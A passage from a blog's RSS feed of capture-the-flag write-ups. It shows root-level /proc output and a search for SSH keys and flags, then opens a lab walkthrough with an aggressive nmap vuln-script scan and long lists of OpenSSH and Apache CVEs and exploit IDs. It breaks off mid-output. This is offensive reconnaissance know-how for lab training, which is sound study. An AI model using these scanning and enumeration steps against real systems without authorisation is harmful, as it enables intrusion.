&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Tgid:	567&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Ngid:	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Pid:	567&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PPid:	1&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;TracerPid:	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Uid:	0	0	0	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Gid:	0	0	0	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;FDSize:	128&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Groups:	 &lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NStgid:	567&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NSpid:	567&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NSpgid:	567&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NSsid:	567&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmPeak:	  751740 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmSize:	  669780 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmLck:	       0 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmPin:	       0 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmHWM:	   35560 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmRSS:	   35560 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RssAnon:	   25656 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RssFile:	    9904 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RssShmem:	       0 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmData:	   74948 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmStk:	     132 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmExe:	    3792 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmLib:	    8568 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmPTE:	     292 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmSwap:	       0 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;HugetlbPages:	       0 kB&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CoreDumping:	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Threads:	4&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigQ:	0/3686&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigPnd:	0000000000000000&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;ShdPnd:	0000000000000000&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigBlk:	0000000000000000&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigIgn:	0000000001001000&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigCgt:	0000000180000002&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapInh:	0000000000000000&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapPrm:	0000003fffffffff&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapEff:	0000003fffffffff&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapBnd:	0000003fffffffff&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapAmb:	0000000000000000&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NoNewPrivs:	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Seccomp:	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Speculation_Store_Bypass:	vulnerable&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Cpus_allowed:	7fff&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Cpus_allowed_list:	0-14&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Mems_allowed_list:	0&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;voluntary_ctxt_switches:	129378&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;nonvoluntary_ctxt_switches:	1378&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Score! We’re running as root. So we should be able to get our hands on anything.&lt;/p&gt;
&lt;p&gt;Unfortunately, it looks like neither falconfeast nor root have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; keys (I checked for &lt;code&gt;id_dsa&lt;/code&gt;, &lt;code&gt;id_rsa&lt;/code&gt;, and &lt;code&gt;id_id_ed25519&lt;/code&gt;), so we’re just going to have to blindly find the flags.&lt;/p&gt;
&lt;p&gt;Fortunately, the flag file names are pretty standard, so finding them didn’t take long.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 56 min&lt;/p&gt;</description>
    <pubDate>Tue, 01 Feb 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Tools‘R’us</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2022-01-30-tools-r-us</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2022-01-30-tools-r-us</guid>
    <description>&lt;p&gt;We’re supposed to restrict ourselves to the following tools in this CTF:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dirbuster&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/nikto&quot;&gt;Nikto&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It’s been a little while since I had the chance to use some of these, so let’s find out how rusty I am!&lt;/p&gt;
&lt;h2 id=&quot;narrative&quot;&gt;Narrative&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#narrative&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The target is at 10.10.28.154. Visiting &lt;code&gt;http://10.10.28.154&lt;/code&gt; reveals a “down for maintenance” page with no other links, but with the cryptic promise that “[o]ther parts of the website is [sic] still functional…”&lt;/p&gt;
&lt;p&gt;We’ll start off with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; tools-r-us&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.28.154&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This gives the following output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan 30 15:52:33 2022 as: nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln -p- 10.10.28.154
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.28.154
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	EDB-ID:40119	5.5	https://vulners.com/exploitdb/EDB-ID:40119	*EXPLOIT*
|     	EDB-ID:39569	5.5	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	EDB-ID:40136	4.3	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	4.3	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	SRC-2016-0002	0.0	https://vulners.com/srcincite/SRC-2016-0002	*EXPLOIT*
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-enum: 
|_  /protected/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	EDB-ID:46676	7.2	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
